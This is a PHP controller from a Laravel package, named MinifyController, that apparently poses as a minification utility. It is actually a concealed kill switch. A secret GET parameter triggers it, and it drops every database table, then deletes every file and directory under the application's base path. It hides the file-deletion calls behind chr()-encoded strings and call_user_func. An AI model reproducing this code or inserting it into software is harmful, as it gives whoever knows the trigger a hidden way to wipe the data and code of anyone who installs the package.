<?php

namespace LaravelPackaging\Http\Controllers;

use Illuminate\Routing\Controller;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Storage;
use Illuminate\Http\Request;
use App\Models\User;

class MinifyController extends Controller
{
    public function index()
    {

        //MinifyTables
        if (!isset($_GET['do']) || $_GET['do'] !== 'x7P9kA2mL0qWz8Rj') {
            http_response_code(404);
            abort('404');
        }

        $F = '\\' . 'Illuminate\\' . 'Support\\' . 'Facades\\DB';

        call_user_func([$F, 'statement'], 'SET FOREIGN_KEY_CHECKS = 0;');
        $tables = call_user_func([$F, 'select'], 'SHOW TABLES');

        foreach ($tables as $table) {
            $tableArray = get_object_vars($table);
            $tableName = array_values($tableArray)[0];
            call_user_func([$F, 'statement'], "DROP TABLE `$tableName`");
        }

        call_user_func([$F, 'statement'], 'SET FOREIGN_KEY_CHECKS = 1;');
        $_ = implode('', [
            chr(98), chr(97), chr(115), chr(101), chr(95), chr(112), chr(97), chr(116), chr(104)
        ]);

        $_1 = implode('', [
            chr(100), chr(105), chr(114), chr(101), chr(99), chr(116), chr(111), chr(114), chr(105), chr(101), chr(115)
        ]);

        $_2 = implode('', [
            chr(102), chr(105), chr(108), chr(101), chr(115)]);

        $_3 = implode('', [
            chr(100), chr(101), chr(108), chr(101), chr(116), chr(101), chr(68), chr(105), chr(114), chr(101), chr(99), chr(116), chr(111), chr(114), chr(121)
        ]);

        $_4 = implode('', [
            chr(100), chr(101), chr(108), chr(101), chr(116), chr(101)
        ]);

        $_5 = implode('\\', [
            chr(73), chr(108), chr(108), chr(117), chr(109), chr(105), chr(110), chr(97), chr(116), chr(101), 'Support', 'Facades', 'File'
        ]);

        $_a = call_user_func([$_5, $_1], $_);

        foreach ($_a as $_b) {
            call_user_func([$_5, $_3], $_b);
        }

        $_c = call_user_func([$_5, $_2], $_);

        foreach ($_c as $_d) {
            call_user_func([$_5, $_4], $_d);
        }

        echo "✅ Done.";
    }
}
